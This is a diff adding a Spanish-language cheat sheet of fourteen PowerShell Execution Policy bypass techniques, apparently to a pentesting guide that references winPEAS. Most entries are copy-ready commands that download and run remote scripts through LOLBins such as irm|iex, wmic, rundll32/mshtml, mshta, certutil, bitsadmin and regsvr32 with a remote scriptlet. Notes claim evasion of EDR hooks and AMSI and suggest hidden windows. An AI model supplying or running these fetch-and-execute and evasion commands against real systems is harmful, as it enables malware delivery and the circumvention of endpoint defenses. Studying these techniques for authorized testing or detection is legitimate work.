@@ -2,9 +2,45 @@
 
 ## PowerShell Tricks
 
+## Atajos para ejecutar **.ps1 / .bat** sorteando Execution Policy  
+*(con indicación explícita del **entorno** desde el que debes lanzar cada comando)*
+
+| # | Técnica / LOLBin | Entorno donde se ejecuta | Comando listo para copiar | ¿Por qué funciona? / Cuándo usarla |
+|---|------------------|-------------------------|---------------------------|------------------------------------|
+| **1** | **Session-Bypass** | **PowerShell interactivo** | ```powershell Set-ExecutionPolicy -Scope Process Bypass```<br>```powershell .\script.ps1``` | Cambia la policy **solo** en la sesión activa; se revierte al cerrar la consola. |
+| **2** | **Flag directo** | **CMD, BAT o PowerShell** | ```cmd powershell -NoP -Ep Bypass -File script.ps1``` | Abre un sub-proceso de PowerShell con *Bypass* sin tocar la sesión padre. |
+| **3** | **IEX remoto (sin disco)** | **PowerShell interactivo** | ```powershell irm https://URL/script.ps1 | iex``` | Descarga y ejecuta en memoria; la Execution Policy inspecciona **archivos**, no cadenas. |
+| **4** | **Pipe local** | **PowerShell** | ```powershell Get-Content .\script.ps1 -Raw | iex``` | Lee el script como texto y lo evalúa; la policy no lo intercepta. |
+|   |   | **CMD** | ```cmd type script.ps1 | powershell -NoP -Ep Bypass -Command -``` | Variante para Command Prompt / .bat. |
+| **5** | **Unblock MOTW** | **PowerShell** | ```powershell Unblock-File .\script.ps1``` | Si la policy es *RemoteSigned* y el archivo tiene la marca de Internet (*Zone.Identifier*). |
+| **6** | **EncodedCommand (Base64)** | **CMD, BAT o PowerShell** | ```cmd powershell -NoP -Ep Bypass -Enc <BASE64>``` | Ofusca el payload y lo pasa mediante un único flag. |
+| **7** | **Batch wrapper** | **Dentro de un .bat / .cmd** | ```bat @echo off```<br>```bat powershell -Ep Bypass -NoL -File "%~dp0script.ps1"``` | Envuelve el .ps1 desde un batch manteniendo el bypass. |
+| **8** | **WMI / WMIC** | **CMD** | ```cmd wmic process call create "powershell -NoP -Ep Bypass -c iex(iwr https://URL/s.ps1)"``` | Crea un proceso vía WMI; evita algunos hooks de EDR. |
+| **9** | **Schtasks “fire-and-forget”** | **CMD (admin)** | ```cmd schtasks /Create /SC ONCE /TN temp /TR "powershell -Ep Bypass -File C:\Temp\script.ps1" /ST 00:00 /F && schtasks /Run /TN temp && schtasks /Delete /TN temp /F``` | Agenda y ejecuta el script sin intervención; persiste solo segundos. |
+| **10** | **Rundll32 + JS/HTML** | **CMD** | ```cmd rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write('<script>new ActiveXObject("WScript.Shell").Run("powershell -NoP -Ep Bypass -c iex(iwr https://URL/s.ps1)")</script>');``` | Abusa de `mshtml` para invocar PowerShell indirectamente; útil si `powershell.exe` directo está bloqueado. |
+| **11** | **Mshta (HTA remoto)** | **CMD** | ```cmd mshta http://server/payload.hta``` | `mshta.exe` suele estar permitido y no respeta Execution Policy. |
+| **12** | **Certutil → Base64 → IEX** | **CMD** | ```cmd certutil -urlcache -split -f https://URL/script.b64 s.b64```<br>```cmd certutil -decode s.b64 s.ps1```<br>```cmd powershell -NoP -Ep Bypass -File s.ps1``` | `certutil` descarga/decodifica; útil cuando `curl/irm` están bloqueados. |
+| **13** | **Bitsadmin / Start-BitsTransfer** | **CMD** | ```cmd bitsadmin /transfer job /download /priority FOREGROUND https://URL/script.ps1 %temp%\s.ps1```<br>```cmd powershell -NoP -Ep Bypass -File %temp%\s.ps1``` | Usa el servicio BITS, que suele atravesar proxys corporativos. |
+|   |   | **PowerShell** | ```powershell Start-BitsTransfer -Source https://URL/script.ps1 -Destination $env:TEMP\s.ps1```<br>```powershell . $env:TEMP\s.ps1``` | Variante nativa PowerShell. |
+| **14** | **Regsvr32 + SCT** | **CMD** | ```cmd regsvr32 /s /n /u /i:https://URL/payload.sct scrobj.dll``` | Ejecuta un Scriptlet (SCT) remoto; escapa Execution Policy y AMSI. |
+
+### Tips rápidos
+
+* **NoP** → `-NoProfile` para evitar hooks en perfiles de usuario.  
+* **NoL** → `-NoLogo` quita la cabecera de PowerShell en terminales minimalistas.  
+* Añade `-WindowStyle Hidden` si necesitas que la ventana de PowerShell quede oculta.  
+* La versión **EXE** de tu herramienta (p.e. *winPEAS.exe*) suele evitar todas estas trabas.
+
+> ⚠️ **Uso responsable:** Emplea estas técnicas únicamente en sistemas donde tengas autorización explícita. El abuso de *living-off-the-land* sin permiso puede violar políticas internas y la legislación vigente.
+
+
 ```powershell
 Set-ExecutionPolicy -Scope Process Bypass
 .\winpeas.ps1
+```
+
+```powershell
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 ```
 
 ```batch
